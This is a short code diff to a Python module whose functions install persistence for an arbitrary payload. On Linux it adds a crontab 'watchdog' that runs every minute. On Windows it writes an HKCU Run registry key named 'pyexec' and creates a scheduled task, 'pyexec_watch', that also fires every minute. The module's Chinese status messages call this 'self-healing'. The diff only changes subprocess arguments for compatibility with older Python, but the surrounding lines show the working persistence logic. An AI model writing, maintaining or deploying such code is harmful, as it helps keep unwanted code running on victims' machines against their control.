@@ -23,7 +23,7 @@ def run(payload, marker):
 def _linux(payload, marker):
     out = []
     try:
-        cur = subprocess.check_output(["crontab", "-l"], text=True,
+        cur = subprocess.check_output(["crontab", "-l"], universal_newlines=True,
                                       stderr=subprocess.DEVNULL)
     except Exception:
         cur = ""
@@ -41,7 +41,7 @@ def _linux(payload, marker):
         out.append(f"watchdog 每分钟: {marker}")
     else:
         out.append("watchdog 已存在")
-    subprocess.run(["crontab", "-"], input=new, text=True, timeout=10)
+    subprocess.run(["crontab", "-"], input=new, universal_newlines=True, timeout=10)
     return "(cron 自愈已安装)\n" + "\n".join(f"  {x}" for x in out)
 
 
@@ -52,7 +52,7 @@ def _windows(payload, marker):
             ["reg", "add",
              r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
              "/v", "pyexec", "/d", payload, "/f"],
-            timeout=10, capture_output=True)
+            timeout=10, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         out.append("主路径 Run 键: pyexec")
     except Exception as e:
         out.append(f"Run 键失败: {e}")
@@ -63,7 +63,7 @@ def _windows(payload, marker):
         subprocess.run(
             ["schtasks", "/create", "/tn", "pyexec_watch", "/tr", cmd,
              "/sc", "minute", "/mo", "1", "/f"],
-            timeout=10, capture_output=True)
+            timeout=10, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         out.append("watchdog 计划任务: pyexec_watch（每分钟）")
     except Exception as e:
         out.append(f"计划任务失败: {e}")
